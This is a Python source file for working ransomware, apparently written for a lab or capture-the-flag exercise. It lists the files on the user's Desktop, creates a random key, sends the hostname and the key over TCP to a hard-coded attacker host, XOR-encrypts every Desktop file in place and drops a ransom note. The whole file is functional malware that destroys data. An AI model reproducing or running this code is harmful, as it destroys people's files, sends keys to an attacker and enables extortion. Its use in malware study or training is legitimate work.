import socket # used for network connections
import os # used for interacting with file system
import threading
import queue
import random # random num
import sys # system commands



# encrypts all files from on the same directory of the program
#then transmits the user hostname and a random 512 bit key back to
#malware server

#encryption functions threads will run
def encrypt(key):
    while True:
        file_path = q.get()  # pulls file path out of queue
        print(f"Encrypting {file_path}")
        try:
            with open(file_path, "rb") as f: # opens file in raed binary mode
                data = f.read() # saves file content into memory

            key_len = len(key)
            # Efficiently XOR the entire file in memory
            processed_data = bytes([data[i] ^ ord(key[i % key_len]) for i in range(len(data))])
            # It uses the XOR operator (^) to scramble each byte of the file against a character in your key
            with open(file_path, "wb") as f:
                f.write(processed_data)
            # Opens the file in Write Binary mode and replaces the original content with the scrambled "garbage" data.

            print(f"Successfully Encrypted {file_path}")
        except Exception as e:
            print(f"Failed to Encrypt {file_path}: {e}")
        q.task_done()

#socket info
IP_ADDRESS = "10.23.95.87"
PORT = 5678

# encryption info
ENCRYPT_LEVEL = 512//8 # 512 bit encryption 64 bites

key_char_pool = ""
for i in range(0x00, 0x255): # every askey character between 0 and 255
    key_char_pool += chr(i)

key_char_pool_length = len(key_char_pool)

# file paths to encrypt
print("Preparing files")

desktop_path = os.environ["USERPROFILE"] + "\\Desktop"
#finds a path to desktop
files = os.listdir(desktop_path)

abs_files = []
for file in files:
    if os.path.isfile(f"{desktop_path}\\{file}") and file != sys.executable:
        # if file is in path and is not this file add to abs_files
        abs_files.append(f"{desktop_path}\\{file}")


print("Sucessfully located all files")

#clinets hostname so attacker knows what key is with each victim
hostname = socket.gethostname()

#encryption key
print("Getting encryption key")
key = ""

for i in range(ENCRYPT_LEVEL):
    key += key_char_pool[random.randint(0, key_char_pool_length - 1)]
    # picks random character form key_char_pool to build the encryption key
print("Key Generated")

# connect to server to transfer key and hostname
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: #creates TCP network socket connection
    s.connect((IP_ADDRESS, PORT)) # connects to host (serverRansomWare.py
    print("Successfully Connected transmiting hostname and encryption key")
    s.send(f"hostname: {hostname} \nkey: {key}".encode("utf-8"))
    #Sends the hostname and the key to the server so it can be saved in encrypted.txt
    print("Successfully sent hostname and encryption key")
    s.close() # close socket

# threading to speed up encryption and decryption

# stores files in queue for threads to handle when encrypting
q = queue.Queue() # holds all file paths
for file in abs_files: # puts every file found in desktop into queue
    q.put(file)

# uses threads for encryption
for i in range(30):
    t = threading.Thread(target=encrypt, args=(key,))
    t.start()
    # starst 10 thread workers that all start running the encryption function at same time

q.join() # pause script untill every file has been processed
print("Encrypted all files and upload complete")

# creates read me file for victim

note_path = os.path.join(desktop_path, "READ_ME_FOR_DECRYPTION.txt")
# path for new file
try:
    with open(note_path, "w") as note: # creates a new file to contact attacker
        note.write("ALL YOUR FILES ARE ENCRYPTED!\n")
        note.write("To get your files back, contact: support@ctf-challenge.local\n")
        note.write(f"Your hostname ID is: {hostname}\n")
    print(f"Ransom note created at: {note_path}")
except Exception as e:
    print(f"Failed to create ransom note: {e}")





